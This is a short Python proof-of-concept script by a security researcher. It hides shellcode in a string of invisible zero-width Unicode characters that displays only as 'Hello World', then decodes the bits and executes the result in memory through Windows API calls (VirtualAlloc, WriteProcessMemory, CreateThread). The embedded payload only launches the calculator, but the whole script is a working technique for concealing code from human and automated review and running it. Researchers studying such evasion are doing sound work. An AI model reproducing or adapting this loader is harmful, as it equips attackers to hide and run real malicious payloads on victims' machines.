# Documentation about this PoC is here: http://www.vallejo.cc/2019/05/poc-encrypting-malicious-script-into.html
# Author: Javier Vicente Vallejo
# This PoC decodes and calls a shellcode (shellcodes executes calc) that is encoded into invisible unicode characters
# Using shellcode from: https://github.com/peterferrie/win-exec-calc-shellcode/blob/master/build/bin/w64-exec-calc-shellcode.bin

s = '''‍​‌‌​‌​‌​​‌‌​​​​​​‌​‌‌​‌​​‌‌​‌​​​​‌‌​​​‌‌​‌‌​​​​‌​‌‌​‌‌​​​‌‌​​​‌‌​‌​‌​‌​​​‌​‌‌​​‌​‌​​‌​​​​​‌​‌​​‌‌‌​‌​‌​​​‌‌​​‌​‌​‌​​‌​​​‌​​​‌​‌‌​​‌‌​​‌​​‌​​‌​​​‌​​​‌​‌‌​‌‌‌​‌‌​​​​‌‌​​​​‌​​‌​​​‌​​​‌​‌‌​‌‌‌​‌‌​​​​‌​​​​​‌​​‌​​​‌​‌​‌‌​‌​‌​​‌​​​‌​​​‌​‌‌​​‌‌​​​​​‌​​‌​​​‌​​​‌​‌‌​‌‌‌‌‌‌​​​‌‌​​​​​​​​​​‌‌​‌​‌​‌‌‌​​‌‌‌‌​​‌​​​‌​‌‌​‌​‌‌‌​​​​​‌​‌‌‌​​‌​‌​​​‌​​​‌​‌‌​‌‌‌​‌​​​​​‌‌‌‌‌​​‌​​​​​​‌​​‌​​​​​​​​​​‌‌‌‌‌‌‌‌​‌​​​‌​‌‌​‌​‌​‌​​​​​‌‌‌‌‌​​‌​​‌​​​​​​‌‌‌‌‌​‌‌​‌‌‌​​‌​‌‌​​​​​‌​‌‌‌‌​​​‌‌​‌​‌​‌​​‌​​​​​​​‌​‌​‌​‌‌​‌‌​​​​​​‌​​‌‌‌‌​​​​​​​‌‌‌​‌​‌​‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​‌​​​‌​‌​‌‌‌​‌​‌‌‌‌​‌‌‌‌‌​​​‌​‌‌​‌‌‌​‌​​​​​‌‌‌‌‌​​​‌‌‌​​​‌​​‌​​​​​​​​​​‌‌‌‌‌‌‌‌​‌​​​‌​‌‌​​‌‌​‌​​‌​‌​‌‌‌​​‌​​‌​​​​​​​​​​‌‌‌‌‌​‌‌‌‌​​‌‌​​‌‌‌‌‌‌‌‌‌‌‌​‌​‌‌‌‍Hello World'''
#decrypt the encoded "malicious" code 
#remove unicode bytes
s = s.split("\xe2\x80\x8d")[1].replace("\xe2\x80","")
#0x8b = bit 0   0x8c = bit 1
l = map(lambda x: x-0x8b, map(ord, s))
#bits -> string
shellcode = "".join(chr(int("".join(map(str,l[i:i+8])),2)) for i in range(0,len(l),8))
#execute shellcode
from ctypes import *
ptr = windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
hproc = windll.kernel32.OpenProcess(0x1F0FFF,False,windll.kernel32.GetCurrentProcessId())
windll.kernel32.WriteProcessMemory(hproc, ptr, shellcode, len(shellcode), byref(c_int(0)))
windll.kernel32.CreateThread(0,0,ptr,0,0,0)
windll.kernel32.WaitForSingleObject(c_int(-1), c_int(-1))